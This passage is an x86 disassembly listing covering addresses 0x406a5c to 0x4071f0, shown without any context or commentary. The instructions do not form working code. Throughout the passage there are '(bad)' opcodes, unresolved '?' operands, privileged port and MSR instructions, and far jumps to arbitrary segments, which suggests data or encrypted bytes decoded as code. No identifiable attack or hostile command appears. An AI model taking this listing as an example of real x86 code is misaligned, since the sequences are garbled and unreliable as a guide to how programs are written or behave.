  406a5c:	push   edx
  406a5d:	inc    BYTE PTR [ecx]
  406a5f:	inc    edi
  406a60:	or     BYTE PTR ss:[ebx+0x15],cl
  406a64:	xor    ecx,DWORD PTR [ebx-0x38]
  406a67:	mov    ebp,0x85f68d72
  406a6c:	mov    ebx,0x7db1d6a1
  406a71:	call   0x5a0bffe8
  406a76:	jp     0x406a10
  406a78:	rol    DWORD PTR [esi-0x63b95fd0],0x1
  406a7f:	and    al,0xe1
  406a81:	mov    al,ds:0xf7c91776
  406a86:	push   ebp
  406a87:	out    dx,eax
  406a88:	cmp    al,0x99
  406a8a:	out    dx,eax
  406a8b:	out    dx,eax
  406a8c:	mov    bh,0xa7
  406a8e:	cdq    
  406a8f:	adc    DWORD PTR [edi],ebp
  406a91:	push   ecx
  406a92:	lock popf 
  406a94:	mov    DWORD PTR [ecx+0x2b],eax
  406a97:	mov    bl,0x29
  406a99:	sbb    DWORD PTR ds:0xa15f94af,ebx
  406a9f:	or     ebp,DWORD PTR ds:0x847a6e2f
  406aa5:	adc    eax,0x18b8fbac
  406aaa:	ja     0x406b29
  406aac:	pusha  
  406aad:	xor    al,0xf9
  406aaf:	adc    eax,0xda61a4a3
  406ab4:	scas   eax,DWORD PTR es:[edi]
  406ab5:	dec    ebp
  406ab6:	and    bl,BYTE PTR [edx+0x1d34873b]
  406abc:	test   BYTE PTR [edi],ch
  406abe:	loop   0x406aef
  406ac0:	cmp    ecx,DWORD PTR [ecx+0x79]
  406ac3:	cmp    al,0x36
  406ac5:	jmp    0xe7a3:0x95d248e
  406acc:	mov    dl,BYTE PTR [ebx]
  406ace:	clc    
  406acf:	jns    0x406a5f
  406ad1:	pop    es
  406ad2:	aam    0x1a
  406ad4:	cmp    edi,esi
  406ad6:	jge    0x406a76
  406ad8:	push   ebp
  406ad9:	mov    ecx,0x9e6589f8
  406ade:	xor    eax,0x5180463
  406ae3:	push   0x4d
  406ae5:	xchg   DWORD PTR [edi+0x1f3abf00],edi
  406aeb:	sub    al,0x42
  406aed:	inc    edx
  406aee:	dec    esi
  406aef:	sbb    bh,BYTE PTR [ecx-0xb]
  406af2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406af3:	mov    bl,0xc1
  406af5:	(bad)  
  406af6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406af7:	bound  esi,QWORD PTR [ecx]
  406af9:	mov    ebp,0xd672251f
  406afe:	inc    ebp
  406aff:	repnz ror bl,cl
  406b02:	jbe    0x406b20
  406b04:	ror    BYTE PTR [eax+0x13],0x4e
  406b08:	sbb    ah,BYTE PTR [edx-0x31]
  406b0b:	js     0x406a9b
  406b0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b0e:	or     ch,0xe0
  406b11:	xlat   BYTE PTR ds:[ebx]
  406b12:	stc    
  406b13:	add    ebp,ecx
  406b15:	stc    
  406b16:	loopne 0x406ad9
  406b18:	or     BYTE PTR [edx+0x76981f39],dh
  406b1e:	cli    
  406b1f:	mov    ch,0x4
  406b21:	mov    DWORD PTR [eax-0x20],ecx
  406b24:	pop    edi
  406b25:	lock lods eax,DWORD PTR ds:[esi]
  406b27:	jnp    0x406b98
  406b29:	mov    bh,BYTE PTR cs:[ebx]
  406b2c:	pop    ds
  406b2d:	fiadd  WORD PTR ds:0x22425d69
  406b33:	sar    DWORD PTR [ecx+0x8],cl
  406b36:	scas   al,BYTE PTR es:[edi]
  406b37:	add    al,0x52
  406b39:	(bad)  
  406b3a:	dec    edi
  406b3b:	(bad)  
  406b3d:	sti    
  406b3e:	nop
  406b3f:	mov    edx,0xd8ae5d13
  406b44:	push   0xc189a98
  406b49:	stos   BYTE PTR es:[edi],al
  406b4a:	dec    edi
  406b4b:	neg    BYTE PTR [ebx+eiz*2-0x63]
  406b4f:	mov    WORD PTR [eax],ss
  406b51:	int    0x42
  406b53:	mov    cl,0x9b
  406b55:	gs xor eax,0x283f1b46
  406b5b:	es cld 
  406b5d:	xor    DWORD PTR [ecx-0x36],ebx
  406b60:	in     al,dx
  406b61:	je     0x406b35
  406b63:	das    
  406b64:	jmp    0x406bdc
  406b66:	cs pop edi
  406b68:	dec    esp
  406b69:	fs mov cl,0x10
  406b6c:	cmp    BYTE PTR [eax],0xa
  406b6f:	addr16 js 0x406ba4
  406b72:	inc    ebp
  406b73:	adc    al,0xbe
  406b75:	scas   al,BYTE PTR es:[edi]
  406b76:	mov    ?,WORD PTR [ebp-0x74]
  406b79:	mov    ebx,0xc72d6d67
  406b7e:	and    eax,0xc16bcb89
  406b83:	dec    edx
  406b84:	(bad)  
  406b85:	adc    ecx,DWORD PTR [ebp-0x4c3b394f]
  406b8b:	bnd jo 0x406b44
  406b8e:	shl    BYTE PTR [eax],0xce
  406b91:	push   ecx
  406b92:	dec    esi
  406b93:	clc    
  406b94:	mov    edi,0xdbf87419
  406b99:	mov    al,ds:0xe7308c23
  406b9e:	jne    0x406bb9
  406ba0:	jecxz  0x406ba7
  406ba2:	push   ebx
  406ba3:	adc    esi,DWORD PTR [edx+0x560b0399]
  406ba9:	pop    eax
  406baa:	mov    es,esi
  406bac:	je     0x406b61
  406bae:	push   0x6e
  406bb0:	ins    DWORD PTR es:[edi],dx
  406bb1:	sub    DWORD PTR [edx+0x2b],ebx
  406bb4:	(bad)  
  406bb5:	ja     0x406be9
  406bb7:	call   0x20be:0xcc17aeea
  406bbe:	dec    edx
  406bbf:	shl    DWORD PTR [ebx+0x68],0xfb
  406bc3:	push   eax
  406bc4:	push   eax
  406bc5:	adc    cl,0x95
  406bc8:	in     al,dx
  406bc9:	add    DWORD PTR [edx+eiz*2],0x10b2a256
  406bd0:	not    BYTE PTR [ebx-0x66a0dc48]
  406bd6:	push   cs
  406bd7:	daa    
  406bd8:	aad    0x3e
  406bda:	push   edi
  406bdb:	push   edi
  406bdc:	lock fsubr st,st(2)
  406bdf:	adc    DWORD PTR [ecx],ebp
  406be1:	pusha  
  406be2:	adc    eax,0xf931b609
  406be7:	out    dx,al
  406be8:	rcl    BYTE PTR [esi],1
  406bea:	mov    ah,0xa3
  406bec:	sbb    ah,BYTE PTR [eax]
  406bee:	fs fsubp st(7),st
  406bf1:	sub    BYTE PTR [edi+0x43],0xda
  406bf5:	adc    eax,0x10b2654c
  406bfa:	rcr    al,1
  406bfc:	outs   dx,BYTE PTR ds:[esi]
  406bfd:	loop   0x406c2a
  406bff:	ret    0x4399
  406c02:	pop    ds
  406c03:	movaps xmm1,XMMWORD PTR [edx+edi*2-0x20]
  406c08:	mov    edi,0xbec3768d
  406c0d:	dec    edx
  406c0e:	and    DWORD PTR [edx],ebx
  406c10:	sbb    ch,bh
  406c12:	in     al,dx
  406c13:	adc    eax,0x75ebaffa
  406c18:	pop    es
  406c19:	jbe    0x406c0f
  406c1b:	mov    ds:0x7f54e53b,al
  406c20:	push   eax
  406c21:	in     al,0xcc
  406c23:	loop   0x406bdc
  406c25:	xchg   ebp,eax
  406c26:	sub    al,BYTE PTR [edx-0x605eec5e]
  406c2c:	addr16 adc al,0x5a
  406c2f:	mov    DWORD PTR [ebx],eax
  406c31:	sub    al,0x9f
  406c33:	sbb    edi,DWORD PTR cs:[edi+0x67]
  406c37:	cmp    eax,0x94712fb4
  406c3c:	shr    BYTE PTR [esp+ebp*8-0xc],cl
  406c40:	outs   dx,DWORD PTR ds:[esi]
  406c41:	or     DWORD PTR [edx+edx*4],0x9fc4f039
  406c48:	int    0xae
  406c4a:	outs   dx,DWORD PTR ds:[esi]
  406c4b:	xor    eax,0x9fa94469
  406c50:	repnz loop 0x406c26
  406c53:	dec    ecx
  406c54:	mov    edi,0x90dc4ac
  406c59:	test   DWORD PTR [edx-0x37],ebx
  406c5c:	loop   0x406be5
  406c5e:	js     0x406c1b
  406c60:	test   DWORD PTR [edi+0x2e4785c],ebx
  406c66:	repz dec ebp
  406c68:	bound  edx,QWORD PTR [ebx+0x4d]
  406c6b:	adc    bl,al
  406c6d:	out    dx,al
  406c6e:	or     BYTE PTR [ebx],dl
  406c70:	push   edx
  406c71:	jnp    0x406c6a
  406c73:	mov    cl,0x56
  406c75:	and    BYTE PTR [eax+0x50a14a2f],cl
  406c7b:	stos   BYTE PTR es:[edi],al
  406c7c:	pop    esi
  406c7d:	addr16 fcomi st,st(2)
  406c80:	scas   eax,DWORD PTR es:[edi]
  406c81:	push   0xffffff87
  406c83:	icebp  
  406c84:	mov    edx,0x2432e240
  406c89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c8b:	sbb    al,0xac
  406c8d:	jg     0x406c17
  406c8f:	or     edx,esi
  406c91:	adc    BYTE PTR [ecx+0x27],bh
  406c94:	or     dl,BYTE PTR [edi]
  406c96:	lods   eax,DWORD PTR ds:[esi]
  406c97:	and    al,0x5c
  406c99:	mov    edi,0xedeb0de3
  406c9e:	mov    dh,0xa1
  406ca0:	push   edi
  406ca1:	ins    BYTE PTR es:[edi],dx
  406ca2:	mov    ds:0x90954f07,al
  406ca7:	sbb    DWORD PTR [ecx+0x76],ebp
  406caa:	and    eax,0x264ce056
  406caf:	inc    ebp
  406cb0:	adc    eax,0xb727a3ef
  406cb5:	retf   
  406cb6:	cmc    
  406cb7:	adc    edi,DWORD PTR [edx+edi*8]
  406cba:	mov    ah,BYTE PTR [ebx+0x52]
  406cbd:	sti    
  406cbe:	adc    ah,dl
  406cc0:	xchg   BYTE PTR [esi+eiz*1+0x53],bl
  406cc4:	rol    BYTE PTR [ecx+0x53],0x50
  406cc8:	xor    ebp,ecx
  406cca:	test   DWORD PTR [eax],0xadd7b867
  406cd0:	stc    
  406cd1:	lods   eax,DWORD PTR ds:[esi]
  406cd2:	and    eax,0x417880d
  406cd7:	jbe    0x406d20
  406cd9:	add    al,0xa
  406cdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cdc:	popa   
  406cdd:	out    0xaf,ax
  406ce0:	jle    0x406cef
  406ce2:	dec    edi
  406ce3:	xchg   edi,eax
  406ce4:	stos   DWORD PTR es:[edi],eax
  406ce5:	je     0x406d25
  406ce7:	ja     0x406d31
  406ce9:	pop    edi
  406cea:	addr16 shl ebp,1
  406ced:	mov    ebp,0x3202f4ae
  406cf2:	into   
  406cf3:	mov    ebx,0x15f18430
  406cf8:	push   eax
  406cf9:	add    DWORD PTR [edi+eax*8],0xc48e3a8
  406d00:	(bad)
  406d03:	mov    eax,ds:0xea135770
  406d08:	gs cwde 
  406d0a:	mov    cl,0xc8
  406d0c:	mov    ch,0x60
  406d0e:	(bad)  
  406d10:	push   es
  406d11:	jb     0x406d0a
  406d13:	adc    al,BYTE PTR [edx+0xe]
  406d16:	neg    edi
  406d18:	int3   
  406d19:	call   0x10ddea5
  406d1e:	mov    eax,ds:0x8710bddf
  406d23:	xchg   edi,eax
  406d24:	pop    eax
  406d25:	iret   
  406d26:	outs   dx,BYTE PTR ds:[esi]
  406d27:	mov    cl,BYTE PTR [eax]
  406d29:	push   eax
  406d2a:	int3   
  406d2b:	or     eax,DWORD PTR [ebx-0x7c]
  406d2e:	sbb    bl,cl
  406d30:	push   ss
  406d31:	mov    esp,0x95bcfb24
  406d36:	or     edx,DWORD PTR [ecx-0x35cc7e89]
  406d3c:	(bad)  
  406d3e:	push   cs
  406d3f:	mov    al,ds:0x473af7f8
  406d44:	dec    esi
  406d45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d46:	(bad)  
  406d47:	and    eax,0x4c370c60
  406d4c:	mov    dh,0x83
  406d4e:	and    DWORD PTR [eax],eax
  406d50:	inc    esi
  406d51:	jns    0x406d58
  406d53:	cmp    DWORD PTR [eax],ecx
  406d55:	add    eax,0x486b6cb9
  406d5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d5b:	adc    DWORD PTR [ebp-0x4c96799e],edi
  406d61:	add    ebx,esi
  406d63:	fst    DWORD PTR ds:[edi-0x5b]
  406d67:	enter  0xb476,0x15
  406d6b:	jge    0x406d39
  406d6d:	cwde   
  406d6e:	ss dec esp
  406d70:	in     al,0xf1
  406d72:	ja     0x406d30
  406d74:	pop    es
  406d75:	adc    al,0x68
  406d77:	fisub  DWORD PTR [esi-0x348c300f]
  406d7d:	sar    DWORD PTR ds:0x7ed69e3b,cl
  406d83:	adc    BYTE PTR [edi+ecx*2-0x3a8662f5],dh
  406d8a:	and    al,0x4d
  406d8c:	in     eax,dx
  406d8d:	adc    ebp,DWORD PTR ds:0xd273f324
  406d93:	gs mov ecx,0xd6cf5c6f
  406d99:	xor    DWORD PTR [esi],edx
  406d9b:	stos   DWORD PTR es:[edi],eax
  406d9c:	cmp    eax,0x3d87ad86
  406da1:	mov    bh,BYTE PTR [eax]
  406da3:	test   BYTE PTR [ecx+ebp*1+0x17],dl
  406da7:	shl    BYTE PTR [edx+0x30],1
  406daa:	or     al,al
  406dac:	loop   0x406db8
  406dae:	xor    dl,BYTE PTR [edi+0x4c395c33]
  406db4:	sbb    al,0xa4
  406db6:	jne    0x406dc9
  406db8:	push   edi
  406db9:	cmp    ch,dl
  406dbb:	(bad)  
  406dbc:	mov    DWORD PTR [edx-0x3e30eb89],esp
  406dc2:	aaa    
  406dc3:	shl    BYTE PTR [eax-0x3e16fc8],0x5e
  406dca:	pop    ebx
  406dcb:	(bad)  
  406dcc:	adc    al,0xbb
  406dce:	xor    ebx,DWORD PTR [ebx+eax*1]
  406dd1:	inc    edi
  406dd2:	iret   
  406dd3:	rcl    BYTE PTR [esi+0x73],0x53
  406dd7:	mov    dh,0x23
  406dd9:	sbb    DWORD PTR [ebp+0x301b3438],eax
  406ddf:	push   esi
  406de0:	inc    ebx
  406de1:	xor    al,0x1d
  406de3:	mov    edx,0x325c66a5
  406de8:	stos   DWORD PTR es:[edi],eax
  406de9:	lock test eax,0x7376f98d
  406def:	xor    ebx,esi
  406df1:	sbb    al,0x67
  406df3:	dec    edx
  406df4:	jle    0x406d82
  406df6:	jmp    0x406de8
  406df8:	xlat   BYTE PTR ds:[ebx]
  406df9:	and    ah,BYTE PTR ds:0xa779ea8e
  406dff:	cmp    bl,BYTE PTR [edi]
  406e01:	gs inc ebx
  406e03:	push   ebx
  406e04:	aaa    
  406e05:	cmp    DWORD PTR [ebx-0xc8141b7],eax
  406e0b:	pop    ebp
  406e0c:	(bad)  
  406e0d:	out    dx,eax
  406e0e:	ins    DWORD PTR es:[edi],dx
  406e0f:	dec    ebp
  406e10:	xor    esi,ebp
  406e12:	cmp    cl,BYTE PTR ds:0xb95f417f
  406e18:	nop
  406e19:	sbb    ch,BYTE PTR [eax]
  406e1b:	xchg   BYTE PTR [eax+0x56],bl
  406e1e:	mov    bl,0xa2
  406e20:	mov    edx,0xaf56dc34
  406e25:	adc    bh,ah
  406e27:	sbb    ebx,DWORD PTR [edx+0x43da1067]
  406e2d:	mov    edi,0x6a12f384
  406e32:	fstp   DWORD PTR gs:[edx+0x24]
  406e36:	stos   BYTE PTR es:[edi],al
  406e37:	mov    DWORD PTR [edi+0x2f],0xb2dfb24b
  406e3e:	ins    BYTE PTR es:[edi],dx
  406e3f:	mov    edx,0xc70e6c38
  406e44:	xchg   esi,eax
  406e45:	cmp    DWORD PTR [edi],0x28251ac0
  406e4b:	push   edx
  406e4c:	push   0xffffffac
  406e4e:	je     0x406e16
  406e50:	call   0x46fb:0xf1e3359c
  406e57:	(bad)  [ebp-0x77]
  406e5a:	jno    0x406e28
  406e5c:	popa   
  406e5d:	jmp    0xc481c6d6
  406e62:	jge    0x406df2
  406e64:	(bad)  
  406e65:	cmp    bl,BYTE PTR ds:0x8d541ef1
  406e6b:	cmp    eax,0x396ae19d
  406e70:	and    BYTE PTR [edx-0x77ab54fc],ah
  406e76:	sbb    al,bl
  406e78:	out    0x68,al
  406e7a:	in     al,dx
  406e7b:	add    eax,0x5dbac53e
  406e80:	jecxz  0x406e88
  406e82:	mov    cl,0x52
  406e84:	(bad)  
  406e85:	xlat   BYTE PTR ds:[ebx]
  406e86:	das    
  406e87:	(bad)  
  406e88:	std    
  406e89:	cmp    BYTE PTR [eax+0x33a3d193],bh
  406e8f:	mov    ebp,0xd77064af
  406e94:	daa    
  406e95:	mov    edx,0x399dac58
  406e9a:	shl    BYTE PTR [eax],cl
  406e9c:	pop    eax
  406e9d:	pop    es
  406e9e:	lds    edx,FWORD PTR [ebp+eiz*1+0x7f96cdbe]
  406ea5:	(bad)  
  406ea6:	sub    eax,eax
  406ea8:	imul   ecx,DWORD PTR [ebx+0xa],0x845b076d
  406eaf:	mov    cl,BYTE PTR [eax]
  406eb1:	xlat   BYTE PTR ds:[ebx]
  406eb2:	popf   
  406eb3:	mov    DWORD PTR [edi-0x68],0xf57217af
  406eba:	jge    0x406ec0
  406ebc:	sub    bl,BYTE PTR [edi-0x1c5303a8]
  406ec2:	sub    eax,0x537e25f3
  406ec7:	outs   dx,BYTE PTR ds:[esi]
  406ec8:	hlt    
  406ec9:	ror    edx,cl
  406ecb:	push   esi
  406ecc:	jl     0x406ee9
  406ece:	sub    bh,BYTE PTR [ebx-0x73]
  406ed1:	sbb    al,0xde
  406ed3:	bound  edx,QWORD PTR [ebp+0x66c0570]
  406ed9:	outs   dx,DWORD PTR ds:[esi]
  406eda:	std    
  406edb:	jge    0x406e69
  406edd:	fwait
  406ede:	in     al,dx
  406edf:	lds    ecx,FWORD PTR [eax-0x6c]
  406ee2:	jg     0x406eef
  406ee4:	and    dl,ah
  406ee6:	mov    es,WORD PTR [eax]
  406ee8:	push   esp
  406ee9:	shl    BYTE PTR [ebx+0x70],0x37
  406eed:	in     eax,dx
  406eee:	lods   al,BYTE PTR ds:[esi]
  406eef:	dec    edx
  406ef0:	inc    ebx
  406ef1:	std    
  406ef2:	leave  
  406ef3:	ds mov ebp,0x944ca37c
  406ef9:	or     BYTE PTR [edx+esi*1],al
  406efc:	sub    al,0x6a
  406efe:	xlat   BYTE PTR ds:[ebx]
  406eff:	dec    eax
  406f00:	cmp    eax,0x7903350c
  406f05:	cwde   
  406f06:	mov    ebp,0x1e92231
  406f0b:	jne    0x406f82
  406f0d:	cmp    al,0xdf
  406f0f:	push   ebx
  406f10:	push   edx
  406f11:	fstp   QWORD PTR [esi+0x14]
  406f14:	loop   0x406f42
  406f16:	pop    esi
  406f17:	(bad)  
  406f18:	jl     0x406f17
  406f1a:	(bad)  
  406f1b:	dec    edi
  406f1c:	fiadd  WORD PTR [ecx+ecx*4]
  406f1f:	(bad)  
  406f21:	xchg   esi,eax
  406f22:	push   ebx
  406f23:	imul   esp,DWORD PTR [eax+0x12],0x7f
  406f27:	int3   
  406f28:	call   0x8fa33f97
  406f2d:	(bad)  ds:[bp+si]
  406f31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f32:	shr    bl,0x8d
  406f35:	repnz mov cl,ah
  406f38:	test   DWORD PTR [edi-0x76],ecx
  406f3b:	pop    esp
  406f3c:	inc    esp
  406f3d:	int3   
  406f3e:	jns    0x406f46
  406f40:	jno    0x406f56
  406f42:	mov    ds:0xda85a3b1,al
  406f47:	mov    ah,0x3a
  406f49:	sub    dh,ch
  406f4b:	pop    ss
  406f4c:	in     al,0xa1
  406f4e:	test   BYTE PTR ds:0xb2d9a8c8,dh
  406f54:	mov    dl,0x2f
  406f56:	je     0x406f17
  406f58:	jne    0x406f0b
  406f5a:	sub    BYTE PTR [ecx],bh
  406f5c:	cmp    DWORD PTR [edx],esi
  406f5e:	(bad)  
  406f5f:	cmp    esi,eax
  406f61:	jmp    0x9fd5:0x349f0514
  406f68:	or     al,0xbe
  406f6a:	pop    eax
  406f6b:	inc    esi
  406f6c:	shl    BYTE PTR [edi-0x4201c94a],cl
  406f72:	adc    al,0xac
  406f74:	mov    ds:0xc1dfd83b,eax
  406f79:	comiss xmm0,xmm0
  406f7c:	dec    eax
  406f7d:	(bad)  
  406f7e:	icebp  
  406f7f:	xlat   BYTE PTR ds:[ebx]
  406f80:	sbb    ebx,DWORD PTR [ebp+0x14eca3c7]
  406f86:	cmp    ax,0x487e
  406f8a:	mov    ?,edi
  406f8c:	(bad)  
  406f8d:	xchg   ecx,eax
  406f8e:	jge    0x406f92
  406f90:	ror    BYTE PTR [ebx-0x3d],0x75
  406f94:	and    al,0x15
  406f96:	scas   al,BYTE PTR es:[edi]
  406f97:	pop    ebx
  406f98:	sar    ebp,0x56
  406f9b:	(bad)  
  406f9c:	and    ebx,DWORD PTR [edx]
  406f9e:	fcomp  DWORD PTR [esi+0x4dc278c4]
  406fa4:	sub    DWORD PTR [ecx],0xffffffdb
  406fa7:	or     ah,BYTE PTR [esi+0x1153fb0b]
  406fad:	sub    DWORD PTR ds:0x9a218b6e,ebp
  406fb3:	xor    ah,dh
  406fb5:	cmp    ah,BYTE PTR [ecx+eax*2-0x14]
  406fb9:	cs (bad) 
  406fbb:	aad    0xfa
  406fbd:	mov    ah,0xb3
  406fbf:	imul   esi,DWORD PTR [edi+0x8ba86b9],0xffffffd9
  406fc6:	mov    ecx,0x679aca9c
  406fcb:	fadd   st,st(7)
  406fcd:	push   ecx
  406fce:	test   BYTE PTR [ebp-0xa59236a],0xb
  406fd5:	and    ecx,DWORD PTR [ecx+0x6dcb1af4]
  406fdb:	or     edi,DWORD PTR [edi+eax*8-0x156adbf3]
  406fe2:	ror    eax,1
  406fe4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406fe5:	inc    eax
  406fe6:	adc    bh,0x75
  406fe9:	rcr    DWORD PTR [edi+0x3521cf00],0x42
  406ff0:	outs   dx,BYTE PTR ds:[esi]
  406ff1:	pop    ecx
  406ff2:	mov    ch,0xa9
  406ff4:	scas   al,BYTE PTR es:[edi]
  406ff5:	cmp    BYTE PTR ss:[edi+0x18],al
  406ff9:	cmp    bh,bh
  406ffb:	push   0x66771914
  407000:	inc    edi
  407001:	xor    DWORD PTR [ebx],edi
  407003:	retf   
  407004:	sahf   
  407005:	xchg   ebp,eax
  407006:	lods   eax,DWORD PTR ds:[esi]
  407007:	pop    ecx
  407008:	pusha  
  407009:	scas   eax,DWORD PTR es:[edi]
  40700a:	leave  
  40700b:	test   BYTE PTR [eax],cl
  40700d:	fild   WORD PTR [edx+edx*1-0x71]
  407011:	scas   eax,DWORD PTR es:[edi]
  407012:	or     BYTE PTR [edi],dh
  407014:	jle    0x406fc6
  407016:	pop    eax
  407017:	rol    eax,0xbf
  40701a:	adc    DWORD PTR [ebx+0x55],ebp
  40701d:	mov    ch,0x56
  40701f:	cli    
  407020:	mov    ch,0x1f
  407022:	daa    
  407023:	in     al,dx
  407024:	rcr    BYTE PTR [esi],cl
  407026:	das    
  407027:	ss cmc 
  407029:	into   
  40702a:	dec    ecx
  40702b:	dec    esp
  40702c:	mov    edx,DWORD PTR [edi-0x1e]
  40702f:	or     eax,0xdc49a5fd
  407034:	ins    DWORD PTR es:[edi],dx
  407035:	jbe    0x406ff4
  407037:	dec    edi
  407038:	xchg   edi,eax
  407039:	scas   al,BYTE PTR es:[edi]
  40703a:	jo     0x47f4281e
  407040:	sbb    al,0xea
  407042:	dec    edx
  407043:	aaa    
  407044:	ja     0x406fe6
  407046:	sahf   
  407047:	mov    bh,0xab
  407049:	out    0x4c,al
  40704b:	test   eax,0xe34a3463
  407050:	pop    ebp
  407051:	xlat   BYTE PTR ds:[ebx]
  407052:	stos   DWORD PTR es:[edi],eax
  407053:	adc    BYTE PTR [eax+ecx*1],bh
  407056:	imul   ebp,DWORD PTR [edi],0xeaa90af
  40705c:	rdmsr  
  40705e:	je     0x406ff9
  407060:	lods   eax,DWORD PTR ds:[esi]
  407061:	adc    BYTE PTR [esi-0x7a5ed822],ch
  407067:	outs   dx,DWORD PTR ds:[esi]
  407068:	(bad)  [esi+0x4ab85389]
  40706e:	adc    eax,edx
  407070:	ret    
  407071:	retf   
  407072:	(bad)  
  407073:	(bad)  
  407074:	je     0x407085
  407076:	je     0x406ffc
  407078:	cmp    DWORD PTR [ebx],ecx
  40707a:	shr    BYTE PTR [edx+0x756ebdd4],cl
  407080:	adc    DWORD PTR [ebx-0x16],edi
  407083:	mov    ds:0x507bb9a5,al
  407088:	sub    BYTE PTR [eax-0x3b],cl
  40708b:	mov    edx,0xa2ce3748
  407090:	sbb    bh,bl
  407092:	adc    DWORD PTR [ebx-0x15],ebx
  407095:	push   edx
  407096:	cmc    
  407097:	pushf  
  407098:	fcmovnu st,st(1)
  40709a:	mov    dl,0x50
  40709c:	mov    ebp,0x50515337
  4070a1:	iret   
  4070a2:	dec    esi
  4070a3:	push   ecx
  4070a4:	mov    ds:0x161648ec,al
  4070a9:	lahf   
  4070aa:	aad    0x6b
  4070ac:	add    BYTE PTR [esi+0x1247d9f8],0xa
  4070b3:	mov    cl,0xb4
  4070b5:	and    al,0x1
  4070b7:	enter  0xb290,0x27
  4070bb:	int3   
  4070bc:	mov    ebp,cs
  4070be:	aad    0x67
  4070c0:	repnz stc 
  4070c2:	push   ecx
  4070c3:	xchg   edx,eax
  4070c4:	inc    edx
  4070c5:	fs addr16 xchg sp,ax
  4070c9:	in     eax,0xb3
  4070cb:	pop    esi
  4070cc:	stos   BYTE PTR es:[edi],al
  4070cd:	out    dx,eax
  4070ce:	int3   
  4070cf:	aas    
  4070d0:	and    esi,DWORD PTR ds:0xd434b089
  4070d6:	repnz cs push edi
  4070d9:	xor    al,0x36
  4070db:	cmp    DWORD PTR [eax-0x31],ebx
  4070de:	or     al,0x59
  4070e0:	dec    esi
  4070e1:	xchg   edx,eax
  4070e2:	add    cl,BYTE PTR [edx-0x488ae532]
  4070e8:	mov    ch,0x57
  4070ea:	repnz lods al,BYTE PTR ds:[esi]
  4070ec:	test   BYTE PTR [esi+0x46],al
  4070ef:	pusha  
  4070f0:	mov    al,ds:0x40a00a52
  4070f5:	dec    esp
  4070f6:	inc    ebx
  4070f7:	sub    eax,0xd54f3a76
  4070fc:	cmp    al,0x73
  4070fe:	stos   BYTE PTR es:[edi],al
  4070ff:	dec    edi
  407100:	push   es
  407101:	arpl   ax,bp
  407103:	push   ebp
  407104:	sbb    bl,BYTE PTR [ebp+0x14]
  407107:	ins    BYTE PTR es:[edi],dx
  407108:	dec    esp
  407109:	sahf   
  40710a:	cmp    BYTE PTR [ecx+edx*4],dh
  40710d:	cmp    eax,0xf195085b
  407112:	lahf   
  407113:	xor    BYTE PTR [ebp-0x316eaa58],0x1d
  40711a:	jmp    0x40712e
  40711c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40711d:	jo     0x407181
  40711f:	(bad)  
  407121:	mov    cl,0xd9
  407123:	mov    DWORD PTR [esi-0xc],0xce0cd49
  40712a:	mov    WORD PTR [ecx],cs
  40712c:	in     al,0xad
  40712e:	imul   ecx,DWORD PTR [edi-0x271e90f0],0x6a
  407135:	scas   al,BYTE PTR es:[edi]
  407136:	ja     0x407139
  407138:	aaa    
  407139:	je     0x407155
  40713b:	out    0xd2,eax
  40713d:	and    BYTE PTR [edi+0x22703ad0],ah
  407143:	imul   ebx,DWORD PTR [ebx-0x2b68012c],0x3e08688f
  40714d:	test   BYTE PTR [ebp+0x1c35e9a4],bl
  407153:	add    ch,dh
  407155:	fsub   QWORD PTR [ebx-0x52]
  407158:	cld    
  407159:	scas   eax,DWORD PTR es:[edi]
  40715a:	add    dl,BYTE PTR [esp+ebx*2-0x5272001b]
  407161:	jmp    0x4071bc
  407163:	xor    eax,0x51e39493
  407168:	pushf  
  407169:	hlt    
  40716a:	or     ecx,esp
  40716c:	mov    eax,ds:0x3d1a8ea1
  407171:	test   DWORD PTR [edx],eax
  407173:	jbe    0x407153
  407175:	js     0x407134
  407177:	mov    ds:0xb3180cca,al
  40717c:	lea    esp,[ebx]
  40717e:	shr    edi,cl
  407180:	mov    ah,0xea
  407182:	inc    edi
  407183:	cli    
  407184:	call   0x837d3a48
  407189:	sbb    dh,al
  40718b:	cs popa 
  40718d:	mov    dh,0x1c
  40718f:	xor    eax,0xbbfee319
  407194:	outs   dx,BYTE PTR ds:[esi]
  407195:	pop    ebx
  407196:	mov    esi,0x75ed65f6
  40719b:	stos   DWORD PTR es:[edi],eax
  40719c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40719d:	cmp    al,0x1c
  40719f:	mov    ebx,0x8535c44d
  4071a4:	out    dx,al
  4071a5:	add    al,cl
  4071a7:	pop    es
  4071a8:	xor    dh,ch
  4071aa:	retf   0x2a8d
  4071ad:	xchg   ebx,eax
  4071ae:	dec    esp
  4071af:	test   al,0x69
  4071b1:	lahf   
  4071b2:	push   0x3ea606a5
  4071b7:	mov    ebx,0x509255a7
  4071bc:	xchg   ecx,eax
  4071bd:	lods   eax,DWORD PTR ds:[esi]
  4071be:	inc    edi
  4071bf:	dec    ecx
  4071c0:	add    bh,BYTE PTR [ebp+0x57]
  4071c3:	ja     0x4071bd
  4071c5:	hlt    
  4071c6:	outs   dx,DWORD PTR ds:[esi]
  4071c7:	dec    ebp
  4071c8:	sti    
  4071c9:	xor    DWORD PTR [edi],eax
  4071cb:	fld    TBYTE PTR [ebx+0x5d]
  4071ce:	sbb    al,0xb2
  4071d0:	gs jbe 0x407239
  4071d3:	fadd   st,st(6)
  4071d5:	aam    0xcb
  4071d7:	aad    0xfa
  4071d9:	pop    esp
  4071da:	retf   0x5b10
  4071dd:	je     0x40719e
  4071df:	sti    
  4071e0:	jmp    0x40720f
  4071e2:	or     eax,0x10b1b15c
  4071e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071e8:	sbb    DWORD PTR [edi-0x4],edi
  4071eb:	repz jmp 0x407257
  4071ee:	mov    ah,0xab
  4071f0:	dec    ecx
